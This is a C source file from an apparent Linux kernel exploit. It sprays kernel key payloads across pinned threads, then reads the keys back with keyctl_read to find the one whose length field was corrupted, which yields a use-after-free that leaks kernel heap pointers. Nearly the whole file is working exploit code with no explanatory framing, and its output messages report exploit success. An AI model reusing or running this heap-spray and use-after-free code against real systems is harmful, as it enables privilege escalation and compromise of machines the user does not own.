#include <unistd.h>
#include <stdint.h>
#include <stdlib.h>
#include <pthread.h>
#include <stdio.h>
#include <limits.h>

#include "heap_spray.h"
#include "sched_stuff.h"
#include "key_stuff.h"
#include "errhandling.h"

struct key_thread_args {
  u_int32_t nkeys;
  void* xattr_value; // to initialize the first two QWORDS of keys
  size_t xattr_value_sz;
  int barrier;
};

static pthread_t key_tid[N_KEY_THREADS];

static void* entry_key_thread(void* args)
{
  u_int32_t nkeys;
  void* xattr_value;
  size_t xattr_value_sz;
  int barrier;

  nkeys = ((struct key_thread_args*)args)->nkeys;
  xattr_value = ((struct key_thread_args*)args)->xattr_value;
  xattr_value_sz = ((struct key_thread_args*)args)->xattr_value_sz;
  barrier = ((struct key_thread_args*)args)->barrier;
  free(args);

  PIN(EXPLOIT_CPU);
  CHECK_ZERO(spray_keys(nkeys, xattr_value, xattr_value_sz, NULL, 0,
	barrier), "spray_keys");
  PIN(OTHER_CPU);

  return NULL;
}

int create_key_thread(int id)
{
  struct key_thread_args* arg = NULL;
  int ret = 0;
  void* xattr_value = NULL;
  size_t xattr_value_sz = 0x20;

  CHECK_PTR(arg = calloc(1, sizeof(*arg)), "calloc");
  CHECK_PTR(xattr_value = calloc(1, xattr_value_sz), "calloc");

  arg->nkeys = N_KEYS;
  arg->xattr_value = xattr_value;
  arg->xattr_value_sz = xattr_value_sz;
  arg->barrier = 1;

  CHECK_ZERO(pthread_create(&key_tid[id], 0, entry_key_thread,
	(void*)arg), "pthread_create");

  return ret;
}

int join_key_threads(void)
{
  int ret = 0;

  printf("[=] Joining %d key threads.\n", N_KEY_THREADS);
  for (int id = 0; id < N_KEY_THREADS; id++) {
    CHECK_ZERO(pthread_join(key_tid[id], NULL), "pthread_join");
    printf("[=] Joined %d\n", id);
  }

  return ret;
}

// iterates over all keys and finds the one whose length field was
// overwritten
// param: n_keys: how many keys were allocated in spray, i.e.,
// 		  inuse(keys)
int identify_uaf_key(int n_keys) {
  long ret = 0;
  int i = 0;
  uint64_t* leak = NULL;

  CHECK_PTR(leak = calloc(1, USHRT_MAX), "calloc");

  for (i = n_keys - 1; i >= 0 ; i--) {
    CHECK_POS(keyctl_read(keys[i], (char*)leak,
	  USHRT_MAX), "keyctl_read");
    // check if length field was overwritten (overlaps with obfuscated
    // next pointer of free chunk)
    if (leak[1] || leak[3] || leak[6]) {
      uaf_key = keys[i];
      printf("\n[+] [SUCCESS] key %d is UAF\n", i);
      break;
    } else {
      printf(i & 1 ? (i & 2 ? "\\" : "-") : (i & 2 ? "_" : "/"));
    }
  }

  if (i < 0) {
    printf("\n[!] [ERR] %s\n",
	"unable to get UAF on user_key_payload");
    ret = 1;
  }

  free(leak);

  return (int)ret;
}
